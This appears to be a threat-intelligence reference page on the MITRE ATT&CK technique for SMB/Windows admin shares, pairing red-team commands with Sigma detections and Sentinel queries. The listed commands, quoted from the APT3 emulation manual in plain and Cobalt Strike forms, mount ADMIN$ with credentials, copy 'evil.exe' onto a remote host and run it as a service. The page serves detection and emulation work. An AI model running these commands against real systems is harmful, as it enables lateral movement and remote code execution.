
# SMB/Windows Admin Shares

## Description

### MITRE Description

> Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.

Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User', 'Administrator']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1021/002

## Potential Commands

```
net use [\\ip\path] [password] [/user:DOMAIN\user]
net use \\COMP\ADMIN$ password /user:COMP\Administrator (checking password reuse on local admin account)
shell net use [\\ip\path] [password] [/user:DOMAIN\user]
Creating a new service remotely:
net use \\COMP\ADMIN$ "password" /user:DOMAIN_NAME\UserName
copy evil.exe \\COMP\ADMIN$\System32\acachsrv.exe
sc \\COMP create acachsrv binPath= "C:\Windows\System32\acachsrv.exe" start= auto  DisplayName= "DisplayName"
sc \\COMP start acachsrv
Creating a new service remotely:
shell net use \\COMP\ADMIN$ "password" /user:DOMAIN_NAME\UserName
shell copy evil.exe \\COMP\ADMIN$\acachsrv.exe
shell sc \\COMP create acachsrv binPath= "C:\Windows\System32\acachsrv.exe" start= auto description= "Description here" DisplayName= "DisplayName"
shell sc \\COMP start acachsrv
```

## Commands Dataset

```
[{'command': 'net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]\n'
             'net use \\\\COMP\\ADMIN$ password /user:COMP\\Administrator '
             '(checking password reuse on local admin account)',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'shell net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Creating a new service remotely:\n'
             'net use \\\\COMP\\ADMIN$ "password" /user:DOMAIN_NAME\\UserName\n'
             'copy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\n'
             'sc \\\\COMP create acachsrv binPath= '
             '"C:\\Windows\\System32\\acachsrv.exe" start= auto  DisplayName= '
             '"DisplayName"\n'
             'sc \\\\COMP start acachsrv',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Creating a new service remotely:\n'
             'shell net use \\\\COMP\\ADMIN$ "password" '
             '/user:DOMAIN_NAME\\UserName\n'
             'shell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\n'
             'shell sc \\\\COMP create acachsrv binPath= '
             '"C:\\Windows\\System32\\acachsrv.exe" start= auto description= '
             '"Description here" DisplayName= "DisplayName"\n'
             'shell sc \\\\COMP start acachsrv',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'description': 'Detects access to $ADMIN share',
                  'detection': {'condition': 'selection and not filter',
                                'filter': {'SubjectUserName': '*$'},
                                'selection': {'EventID': 5140,
                                              'ShareName': 'Admin$'}},
                  'falsepositives': ['Legitimate administrative activity'],
                  'id': '098d7118-55bc-4912-a836-dc6483a8d150',
                  'level': 'low',
                  'logsource': {'definition': 'The advanced audit policy '
                                              'setting "Object Access > Audit '
                                              'File Share" must be configured '
                                              'for Success/Failure',
                                'product': 'windows',
                                'service': 'security'},
                  'status': 'experimental',
                  'tags': ['attack.lateral_movement', 'attack.t1077'],
                  'title': 'Access to ADMIN$ Share'}},
 {'data_source': {'author': 'Samir Bousseaden',
                  'description': 'This detection excludes known namped pipes '
                                 'accessible remotely and notify on newly '
                                 'observed ones, may help to detect lateral '
                                 'movement and remote exec using named pipes',
                  'detection': {'condition': 'selection1 and not selection2',
                                'selection1': {'EventID': 5145,
                                               'ShareName': '\\\\*\\IPC$'},
                                'selection2': {'EventID': 5145,
                                               'RelativeTargetName': ['atsvc',
                                                                      'samr',
                                                                      'lsarpc',
                                                                      'winreg',
                                                                      'netlogon',
                                                                      'srvsvc',
                                                                      'protected_storage',
                                                                      'wkssvc',
                                                                      'browser',
                                                                      'netdfs'],
                                               'ShareName': '\\\\*\\IPC$'}},
                  'falsepositives': ['update the excluded named pipe to filter '
                                     'out any newly observed legit named pipe'],
                  'id': '52d8b0c6-53d6-439a-9e41-52ad442ad9ad',
                  'level': 'high',
                  'logsource': {'description': 'The advanced audit policy '
                                               'setting "Object Access > Audit '
                                               'Detailed File Share" must be '
                                               'configured for Success/Failure',
                                'product': 'windows',
                                'service': 'security'},
                  'references': ['https://twitter.com/menasec1/status/1104489274387451904'],
                  'tags': ['attack.lateral_movement', 'attack.t1077'],
                  'title': 'First time seen remote named pipe'}},
 {'data_source': {'author': 'Samir Bousseaden',
                  'description': 'detects execution of psexec or paexec with '
                                 'renamed service name, this rule helps to '
                                 'filter out the noise if psexec is used for '
                                 'legit purposes or if attacker uses a '
                                 'different psexec client other than '
                                 'sysinternal one',
                  'detection': {'condition': 'selection1 and not selection2',
                                'selection1': {'EventID': 5145,
                                               'RelativeTargetName': ['*-stdin',
                                                                      '*-stdout',
                                                                      '*-stderr'],
                                               'ShareName': '\\\\*\\IPC$'},
                                'selection2': {'EventID': 5145,
                                               'RelativeTargetName': 'PSEXESVC*',
                                               'ShareName': '\\\\*\\IPC$'}},
                  'falsepositives': ['nothing observed so far'],
                  'id': 'c462f537-a1e3-41a6-b5fc-b2c2cef9bf82',
                  'level': 'high',
                  'logsource': {'description': 'The advanced audit policy '
                                               'setting "Object Access > Audit '
                                               'Detailed File Share" must be '
                                               'configured for Success/Failure',
                                'product': 'windows',
                                'service': 'security'},
                  'references': ['https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html'],
                  'tags': ['attack.lateral_movement', 'attack.t1077'],
                  'title': 'Suspicious PsExec execution'}},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4624', 'Authentication logs']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4624', 'Authentication logs']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']}]
```

## Potential Queries

```json
[{'name': 'Windows Admin Shares',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 3 and process_path contains "net.exe"and '
           '(process_command_line contains "use"or process_command_line '
           'contains "session"or process_command_line contains "file")'},
 {'name': 'Windows Admin Shares Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and (process_path contains "net.exe"or '
           'process_path contains "powershell.exe")and ((process_command_line '
           'contains "*net* use*$"or process_command_line contains "*net* '
           'session*$"or process_command_line contains "*net* file*$")or '
           'process_command_line contains "*New-PSDrive*root*")'},
 {'name': 'Windows Admin Shares Process Created',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and process_path contains "net.exe"and '
           'process_command_line contains "net share"'}]
```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'net '
                                                                              'use '
                                                                              '[\\\\ip\\path] '
                                                                              '[password] '
                                                                              '[/user:DOMAIN\\user]\n'
                                                                              'net '
                                                                              'use '
                                                                              '\\\\COMP\\ADMIN$ '
                                                                              'password '
                                                                              '/user:COMP\\Administrator '
                                                                              '(checking '
                                                                              'password '
                                                                              'reuse '
                                                                              'on '
                                                                              'local '
                                                                              'admin '
                                                                              'account)',
                                                  'Category': 'T1077',
                                                  'Cobalt Strike': 'shell net '
                                                                   'use '
                                                                   '[\\\\ip\\path] '
                                                                   '[password] '
                                                                   '[/user:DOMAIN\\user]',
                                                  'Description': 'Used to view '
                                                                 'network '
                                                                 'shared '
                                                                 'resource '
                                                                 'information, '
                                                                 'add a new '
                                                                 'network '
                                                                 'resource, '
                                                                 'and remove '
                                                                 'an old '
                                                                 'network '
                                                                 'resource '
                                                                 'from the '
                                                                 'computer. '
                                                                 'Run this '
                                                                 'against '
                                                                 'computers '
                                                                 'discovered '
                                                                 'from the '
                                                                 'previous two '
                                                                 'commands to '
                                                                 'view the '
                                                                 'shares that '
                                                                 'are '
                                                                 'available on '
                                                                 'them.',
                                                  'Metasploit': ''}},
 {'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'Creating '
                                                                              'a '
                                                                              'new '
                                                                              'service '
                                                                              'remotely:\n'
                                                                              'net '
                                                                              'use '
                                                                              '\\\\COMP\\ADMIN$ '
                                                                              '"password" '
                                                                              '/user:DOMAIN_NAME\\UserName\n'
                                                                              'copy '
                                                                              'evil.exe '
                                                                              '\\\\COMP\\ADMIN$\\System32\\acachsrv.exe\n'
                                                                              'sc '
                                                                              '\\\\COMP '
                                                                              'create '
                                                                              'acachsrv '
                                                                              'binPath= '
                                                                              '"C:\\Windows\\System32\\acachsrv.exe" '
                                                                              'start= '
                                                                              'auto  '
                                                                              'DisplayName= '
                                                                              '"DisplayName"\n'
                                                                              'sc '
                                                                              '\\\\COMP '
                                                                              'start '
                                                                              'acachsrv',
                                                  'Category': 'T1077',
                                                  'Cobalt Strike': 'Creating a '
                                                                   'new '
                                                                   'service '
                                                                   'remotely:\n'
                                                                   'shell net '
                                                                   'use '
                                                                   '\\\\COMP\\ADMIN$ '
                                                                   '"password" '
                                                                   '/user:DOMAIN_NAME\\UserName\n'
                                                                   'shell copy '
                                                                   'evil.exe '
                                                                   '\\\\COMP\\ADMIN$\\acachsrv.exe\n'
                                                                   'shell sc '
                                                                   '\\\\COMP '
                                                                   'create '
                                                                   'acachsrv '
                                                                   'binPath= '
                                                                   '"C:\\Windows\\System32\\acachsrv.exe" '
                                                                   'start= '
                                                                   'auto '
                                                                   'description= '
                                                                   '"Description '
                                                                   'here" '
                                                                   'DisplayName= '
                                                                   '"DisplayName"\n'
                                                                   'shell sc '
                                                                   '\\\\COMP '
                                                                   'start '
                                                                   'acachsrv',
                                                  'Description': 'This '
                                                                 'technique '
                                                                 'creates a '
                                                                 'new service '
                                                                 'on the '
                                                                 'remote '
                                                                 'machine. '
                                                                 "It's "
                                                                 'important to '
                                                                 'note the '
                                                                 'spaces after '
                                                                 'the = in '
                                                                 'these '
                                                                 'commands! '
                                                                 'Also, before '
                                                                 'starting the '
                                                                 'service, run '
                                                                 'the '
                                                                 'following '
                                                                 'commands to '
                                                                 'make sure '
                                                                 'everything '
                                                                 'is set up '
                                                                 'properly:\n'
                                                                 'sc \\\\COMP '
                                                                 'qc acachsrv\n'
                                                                 'dir '
                                                                 '\\\\COMP\\ADMIN$\\acachsrv.exe',
                                                  'Metasploit': ''}}]
```

# Tactics


* [Lateral Movement](../tactics/Lateral-Movement.md)


# Mitigations


* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)

* [Password Policies](../mitigations/Password-Policies.md)
    
* [Limit Access to Resource Over Network](../mitigations/Limit-Access-to-Resource-Over-Network.md)
    
* [Filter Network Traffic](../mitigations/Filter-Network-Traffic.md)
    

# Actors


* [Deep Panda](../actors/Deep-Panda.md)

* [Ke3chang](../actors/Ke3chang.md)
    
* [Orangeworm](../actors/Orangeworm.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [FIN8](../actors/FIN8.md)
    
* [Turla](../actors/Turla.md)
    
* [Threat Group-1314](../actors/Threat-Group-1314.md)
    
* [APT3](../actors/APT3.md)
    
* [APT32](../actors/APT32.md)
    
* [APT39](../actors/APT39.md)
    
* [Blue Mockingbird](../actors/Blue-Mockingbird.md)
    
